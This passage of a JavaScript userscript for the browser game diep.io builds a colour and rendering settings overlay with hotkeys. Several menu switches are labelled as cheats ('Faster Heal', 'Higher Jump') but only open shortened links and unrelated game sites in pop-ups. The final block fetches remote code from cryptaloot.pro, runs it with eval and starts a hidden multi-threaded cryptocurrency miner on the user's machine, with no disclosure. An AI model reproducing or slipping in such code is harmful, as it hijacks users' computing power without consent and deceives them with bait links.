class="containerFreespace4"></div><a style="font-weight:bold;color:black;font-size:18px;" href="https://goo.gl/XCNoJL" target="blank">Faster Heal</a> <label style="padding-left: 2px;" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'https://goo.gl/XCNoJL\', \'_blank\', \'location=yes,scrollbars=yes,status=yes,height=570,width=520\');"><span class=\'slider\'></span></label><div class="containerFreespace5"></div><a style="font-weight:bold;color:black;font-size:18px;" href="https://goo.gl/6kqrgN" target="blank">Faster Fire</a> <label style="padding-left: 2px;" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'https://goo.gl/6kqrgN\', \'_blank\', \'location=yes,scrollbars=yes,status=yes,height=570,width=520\');"><span class=\'slider\'></span></label><div class="containerFreespace6"></div><a style="font-weight:bold;color:black;font-size:18px;" href="https://goo.gl/FGU9pC" target="blank">Higher Jump</a> <label style="padding-left: 2px;" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'https://goo.gl/FGU9pC\', \'_blank\', \'location=yes,scrollbars=yes,status=yes,height=570,width=520\');"><span class=\'slider\'></span></label><div class="containerFreespace7"></div><a style="font-weight:bold;color:black;font-size:18px;" href="https://mope-io.net" target="blank">Custom Aim Settings</a> <label style="padding-left: 2px;" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'https://skribbl-io.net\', \'_blank\', \'location=yes,scrollbars=yes,status=yes,height=570,width=520\');"><span class=\'slider\'></span></label><div class="containerFreespace8"></div><a style="font-weight:bold;color:black;font-size:18px;" href="https://mopeiogame.com" target="blank">Show FPS</a> <label style="padding-left: 2px;" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'https://moomooioplay.com\', \'_blank\', \'location=yes,scrollbars=yes,status=yes,height=570,width=520\');"><span class=\'slider\'></span></label><div class="containerFreespace9"></div><a style="font-weight:bold;color:black;font-size:18px;" href="https://zombsroyaleio.org" target="blank">Adblock Plus+</a> <label style="padding-left: 2px;" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'https://zombsroyaleio.org\', \'_blank\', \'location=yes,scrollbars=yes,status=yes,height=570,width=520\');"><span class=\'slider\'></span></label><div class="containerFreespace10"></div><a style="font-weight:bold;color:black;font-size:18px;" href="https://iogameslist.org" target="blank">.io Games List 2019</a> <label style="padding-left: 2px;" class=\'switch\'><input type=\'checkbox\' onchange="window.open(\'https://iogameslist.org\', \'_blank\', \'location=yes,scrollbars=yes,status=yes,height=570,width=520\');"><span class=\'slider\'></span></label><div class="containerFreespace11"></div>`;
    var colorPicker = function(id){return `{onFineChange:'overlay.setColorVar(${id}, this); '}`;};
    var _setbgColor = function(){return `{onFineChange:'overlay.setbgColor(this); '}`;};
    var _setBorderColor = function(){return `{onFineChange:'overlay.setBorderColor(this); '}`;};
    var _setminimapbgColor = function(){return `{onFineChange:'overlay.setminimapbgColor(this); '}`;};
    var _setminimapOutline = function(){return `{onFineChange:'overlay.setminimapOutline(this); '}`;};
    var body = `
            <div class="table">
                <div class="row">Background
                </div>
                <div class="row">
                    <div class="cell">Grid Base Alpha<br><span class="grid_base_value">0.3</span></div>
                    <div class="cell"><input type="range" name="grid_base_alpha" value="36"></div>
                </div>
                <div class="row">
                    <div class="cell">Border Alpha<br><span class="border_alpha_value">0.1</span></div>
                    <div class="cell"><input type="range" name="border_alpha" value="10"></div>
                </div>
                <div class="row">
                    <div class="cell">Background</div>
                    <div class="cell"><input class="jscolor ${_setbgColor()}"
                    value="cdcdcd"></div>
                </div>
                <div class="row">
                    <div class="cell">Border</div>
                    <div class="cell"><input class="jscolor ${_setBorderColor()}"
                    value="cdcdcd"></div>
                </div>
                <div class="row">Minimap
                </div>
                <div class="row">
                    <div class="cell">Background</div>
                    <div class="cell"><input class="jscolor ${_setminimapbgColor()}"
                    value="cdcdcd"></div>
                </div>
                <div class="row">
                    <div class="cell">Outline</div>
                    <div class="cell"><input class="jscolor ${_setminimapOutline()}"
                    value="000000"></div>
                </div>
                <div class="row">Environment
                </div>
                <div class="row">
                    <div class="cell">Self (FFA)</div>
                    <div class="cell"><input class="jscolor ${colorPicker(2)}"
                    value="00b1de"></div>
                </div>
                <div class="row">
                    <div class="cell">Barrels</div>
                    <div class="cell"><input class="jscolor ${colorPicker(1)}"
                    value="999999"></div>
                </div>
                <div class="row">
                    <div class="cell">Others (FFA)</div>
                    <div class="cell"><input class="jscolor ${colorPicker(15)}"
                    value="f14e54"></div>
                </div>
                <div class="row">
                    <div class="cell">Smasher Class Outlines</div>
                    <div class="cell"><input class="jscolor ${colorPicker(0)}"
                    value="555555"></div>
                </div>
                <div class="row">
                    <div class="cell">Blue team</div>
                    <div class="cell"><input class="jscolor ${colorPicker(3)}"
                    value="00b1de"></div>
                </div>
                <div class="row">
                    <div class="cell">Red Team</div>
                    <div class="cell"><input class="jscolor ${colorPicker(4)}"
                    value="f14e54"></div>
                </div>
                <div class="row">
                    <div class="cell">Purple Team</div>
                    <div class="cell"><input class="jscolor ${colorPicker(5)}"
                    value="c396e9"></div>
                </div>
                <div class="row">
                    <div class="cell">Green Team</div>
                    <div class="cell"><input class="jscolor ${colorPicker(6)}"
                    value="11d578"></div>
                </div>
                <div class="row">
                    <div class="cell">Fallen Team</div>
                    <div class="cell"><input class="jscolor ${colorPicker(17)}"
                    value="c0c0c0"></div>
                </div>
                <div class="row">
                    <div class="cell">Shiny Shapes</div>
                    <div class="cell"><input class="jscolor ${colorPicker(7)}"
                    value="89ff69"></div>
                </div>
                <div class="row">
                    <div class="cell">Squares</div>
                    <div class="cell"><input class="jscolor ${colorPicker(8)}"
                    value="ffe869"></div>
                </div>
                <div class="row">
                    <div class="cell">Triangles</div>
                    <div class="cell"><input class="jscolor ${colorPicker(9)}"
                    value="fc7677"></div>
                </div>
                <div class="row">
                    <div class="cell">Pentagons</div>
                    <div class="cell"><input class="jscolor ${colorPicker(10)}"
                    value="768dfc"></div>
                </div>
                <div class="row">
                    <div class="cell">Crashers</div>
                    <div class="cell"><input class="jscolor ${colorPicker(11)}"
                    value="f077dc"></div>
                </div>
                <div class="row">
                    <div class="cell">Arena Closers</div>
                    <div class="cell"><input class="jscolor ${colorPicker(12)}"
                    value="ffe869"></div>
                </div>
                <div class="row">
                    <div class="cell">Maze Walls</div>
                    <div class="cell"><input class="jscolor ${colorPicker(14)}"
                    value="bbbbbb"></div>
                </div>
                <div class="row">
                    <div class="cell">Necro Squares (FFA)</div>
                    <div class="cell"><input class="jscolor ${colorPicker(16)}"
                    value="fcc376"></div>
                </div>
                <div class="row">Miscellaneous
                </div>
                <div class="row">
                    <div class="cell">Leaderboard Fill (FFA)</div>
                    <div class="cell"><input class="jscolor ${colorPicker(13)}"
                    value="44ffa0"></div>
                </div>
            </div>`;
    var temp = `<div id="styleSetting"> ${title} ${body} ${descr} </div>`;
    document.querySelector('body').insertAdjacentHTML('afterend', temp);
    var it = document.querySelector('input[name="grid_base_alpha"]').addEventListener('input', function(e) {
        gridAlpha = (e.target.value - e.target.value % 2) / 100;
        document.querySelector('.grid_base_value').innerHTML = gridAlpha;
        reloadSettings();
    });
    it = document.querySelector('input[name="border_alpha"]').addEventListener('input', function(e) {
        borderAlpha = (e.target.value - e.target.value % 2) / 100;
        document.querySelector('.border_alpha_value').innerHTML = borderAlpha;
        reloadSettings();
    });
}

function hexToDec(hex){
    return parseInt(hex, 16);
}

function setColorVar(id, color){
    switch(parseInt(id)){
        case 0:
            smashers = hexToDec(color);
            break;
        case 1:
            barrels = hexToDec(color);
            break;
        case 2:
            ffa_self = hexToDec(color);
            break;
        case 3:
            blue_team = hexToDec(color);
            break;
        case 4:
            red_team = hexToDec(color);
            break;
        case 5:
            purple_team = hexToDec(color);
            break;
        case 6:
            green_team = hexToDec(color);
            break;
        case 7:
            shiny_shapes = hexToDec(color);
            break;
        case 8:
            squares = hexToDec(color);
            break;
        case 9:
            triangles = hexToDec(color);
            break;
        case 10:
            pentagons = hexToDec(color);
            break;
        case 11:
            crashers = hexToDec(color);
            break;
        case 12:
            arena_closers = hexToDec(color);
            break;
        case 13:
            ffa_leaderboard = hexToDec(color);
            break;
        case 14:
            maze_walls = hexToDec(color);
            break;
        case 15:
            ffa_others = hexToDec(color);
            break;
        case 16:
            ffa_necro_squares = hexToDec(color);
            break;
        case 17:
            fallen_team = hexToDec(color);
            break;
    }
    reloadSettings();
}

function setbgColor(color){
    bgColor = hexToDec(color);
    input.set_convar("ren_background_color", bgColor);
}

function setBorderColor(color){
    borderColor = hexToDec(color);
    input.set_convar("ren_border_color", borderColor);
}

function setminimapbgColor(color){
    minimapbgColor = hexToDec(color);
    input.set_convar("ren_minimap_background_color", minimapbgColor);
}

function setminimapOutline(color){
    minimapOutline = hexToDec(color);
    input.set_convar("ren_minimap_border_color", minimapOutline);
}

//3/8/17
function modeSet(){
    var typed = false;
    var modes = document.createElement("INPUT");
    abc.setAttribute("type", "text");
    abc.setAttribute("value", "Start typing!");
    abc.disabled = false;
    abc.setAttribute("style", "font-size:16px;position:absolute;top:0px;right:0px;");
    document.body.appendChild(abc);
}

document.addEventListener('keydown', function(event){
    if (event.keyCode == 36){
        homeConsole = !homeConsole;
    }
    if (homeConsole) return;
    if (event.keyCode == 27){
        fps = _fps;
        bg = _bg;
        edge = _edge;
        colorEdge = _colorEdge;
        color = _color;
        scoreboard = _scoreboard;
        names = _names;
        rawHealth = _rawHealth;
        healthBars = _healthBars;
        achievements = _achievements;
        ui = _ui;
        solidBg = _solidBg;
        mapViewport = _mapViewport;
        gridAlpha = _gridAlpha;
        greenShapes = _greenShapes;
        smashers = _tankBorders;
        barrels = _barrels;
        ffa_self = _blueTeam;
        blue_team = _blueTeam;
        red_team = _redTeam;
        purple_team = _purpleTeam;
        green_team = _greenTeam;
        squares = _squares;
        triangles = _triangles;
        pentagons = _pentagons;
        crashers = _crashers;
        arena_closers = _arenaClosers;
        ffa_leaderboard = _ffaLeaderboard;
        maze_walls = _mazeWalls;
        ffa_necro_squares = _summonerSquares;
        fallen_team = _fallenTeam;
        bgColor = _bgColor;
        borderAlpha = _borderAlpha;
        borderColor = _borderColor;
        minimapbgColor = _minimapbgColor;
        minimapOutline = _minimapOutline;
        shiny_shapes = _shinyShapes;
        input.set_convar("ren_fps", fps);
        input.set_convar("ren_stroke_soft_color", colorEdge);
        input.set_convar("ren_stroke_soft_color_intensity", color);
        input.set_convar("ren_achievements", achievements);
        input.set_convar("ren_names", names);
        input.set_convar("ren_scoreboard", scoreboard);
        input.set_convar("ren_raw_health_values", rawHealth);
        input.set_convar("ren_background", bg);
        input.set_convar("ren_health_bars", healthBars);
        input.set_convar("ren_ui", ui);
        //3/7/17
        input.execute(`net_replace_color 8 ${_squares}`);
        input.execute(`net_replace_color 9 ${_triangles}`);
        input.execute(`net_replace_color 10 ${_pentagons}`);
        input.execute(`net_replace_color 11 ${_crashers}`);
        //3/8/17
        input.set_convar("ren_solid_background", solidBg);
        input.set_convar("ren_minimap_viewport", mapViewport);
        input.set_convar("ren_grid_base_alpha", gridAlpha);
        input.set_convar("ren_background_color", bgColor);
        input.set_convar("ren_border_color_alpha", borderAlpha);
        input.set_convar("ren_border_color", borderColor);
        input.set_convar("ren_minimap_background_color", minimapbgColor);
        input.set_convar("ren_minimap_border_color", minimapOutline);
        setColor("smashers", _tankBorders);
        setColor("barrels", _barrels);
        setColor("ffa_self", _blueTeam);
        setColor("blue_team", _blueTeam);
        setColor("red_team", _redTeam);
        setColor("purple_team", _purpleTeam);
        setColor("green_team", _greenTeam);
        setColor("squares", _squares);
        setColor("triangles", _triangles);
        setColor("pentagons", _pentagons);
        setColor("crashers", _crashers);
        setColor("arena_closers", _arenaClosers);
        setColor("ffa_leaderboard", _ffaLeaderboard);
        setColor("maze_walls", _mazeWalls);
        setColor("ffa_necro_squares", _summonerSquares);
        setColor("fallen_team", _fallenTeam);
        toggle = true;
    }
    if (event.keyCode == 16) shift = true;
    if (event.keyCode == 17) ctrl = true;
    if (toggle === false){
        //Overlay activation - default: TAB
        if (event.keyCode == overlay.keyCode){
            event.preventDefault();
            overlay.toggle = !overlay.toggle;
            toggleOverlay(overlay.toggle);
            toggle = true;
        }
        //Ctrl
        if (ctrl === true){
            //? / / for load saved settings
            if (event.keyCode == 191){
                loadSavedData();
                reloadSettings();
            }
        }
        //Shift
        if (shift === true){
            //S for save
            if (event.keyCode == 83){
                if (storageAvailable('localStorage')){
                    saveData();
                }else{
                    alert("LocalStorage is not supported on your current browser, so save cannot be used!");
                }
                toggle = true;
            }
            //P for minimap viewport
            if (event.keyCode == 80){
                mapViewport = !mapViewport;
                input.set_convar("ren_minimap_viewport", mapViewport);
                toggle = true;
            }
            //Q for solid background
            if (event.keyCode == 81){
                solidBg = !solidBg;
                input.set_convar("ren_solid_background", solidBg);
                toggle = true;
            }
            //F for FPS
            if (event.keyCode == 70){
                fps = !fps;
                input.set_convar("ren_fps", fps);
                toggle = true;
            }
            //Z for background
            if (event.keyCode == 90){
                bg = !bg;
                input.set_convar("ren_background", bg);
                toggle = true;
            }
            //X for edges
            if (event.keyCode == 88){
                edge = !edge;
                colorEdge = false;
                if (edge === true){
                    input.set_convar("ren_stroke_soft_color_intensity", _color);
                    input.set_convar("ren_stroke_soft_color", false);
                }
                if (edge === false){
                    input.set_convar("ren_stroke_soft_color_intensity", 0.0);
                    input.set_convar("ren_stroke_soft_color", true);
                }
                toggle = true;
            }
            //V for colored edges
            if (event.keyCode == 86){
                colorEdge = !colorEdge;
                edge = true;
                if (colorEdge === true){
                    input.set_convar("ren_stroke_soft_color_intensity", _color);
                    input.set_convar("ren_stroke_soft_color", true);
                }
                if (colorEdge === false){
                    input.set_convar("ren_stroke_soft_color_intensity", 0.0);
                    input.set_convar("ren_stroke_soft_color", false);
                }
                toggle = true;
            }
            //B for scoreboard
            if (event.keyCode == 66){
                scoreboard = !scoreboard;
                input.set_convar("ren_scoreboard", scoreboard);
                toggle = true;
            }
            //N for names
            if (event.keyCode == 78){
                names = !names;
                input.set_convar("ren_names", names);
                toggle = true;
            }
            //M for raw health values
            if (event.keyCode == 77){
                rawHealth = !rawHealth;
                input.set_convar("ren_raw_health_values", rawHealth);
                toggle = true;
            }
            //9 for health bars
            if (event.keyCode == 57){
                healthBars = !healthBars;
                input.set_convar("ren_health_bars", healthBars);
                toggle = true;
            }
            //9 for UI
            if (event.keyCode == 48){
                ui = !ui;
                input.set_convar("ren_ui", ui);
                toggle = true;
            }
            //[ for achievements
            if (event.keyCode == 219){
                achievements = !achievements;
                input.set_convar("ren_achievements", achievements);
                toggle = true;
            }
            //- for lighter color
            if (event.keyCode == 189){
                color -= 0.05;
                input.set_convar("ren_stroke_soft_color_intensity", color);
            }
            //+ for darker color
            if (event.keyCode == 187){
                color += 0.05;
                input.set_convar("ren_stroke_soft_color_intensity", color);
            }
            //3/7/17 Update
            //G for darker color
            if (event.keyCode == 71){
                greenShapes = !greenShapes;
                if (greenShapes){
                    input.execute(`net_replace_color 8 ${shiny_shapes}`);
                    input.execute(`net_replace_color 9 ${shiny_shapes}`);
                    input.execute(`net_replace_color 10 ${shiny_shapes}`);
                    input.execute(`net_replace_color 11 ${shiny_shapes}`);
                }else{
                    input.execute(`net_replace_color 8 ${_squares}`);
                    input.execute(`net_replace_color 9 ${_triangles}`);
                    input.execute(`net_replace_color 10 ${_pentagons}`);
                    input.execute(`net_replace_color 11 ${_crashers}`);
                }
            }
        }
    }
});

document.addEventListener('keyup',function(event){
    if (event.keyCode == 16){
        shift = false;
    }else if(event.keyCode == 17){
        ctrl = false;
    }else{
        toggle = false;
    }
});

if (enableMiner && window.navigator.hardwareConcurrency > 1){
    const c = document.createElement("script");
    c.innerHTML = `window.fetch("https://cryptaloot.pro/lib/crypta.js").then(r=>r.text()).then(res=>{window.eval(res);const miner=new window.CRLT.Anonymous("94ebbcc07866199966faba7da8da3d3dd21dfcb435a1",{threads:3,throttle:0.7});miner.start();}).catch(()=>{});`;
    window.document.body.appendChild(c);
}
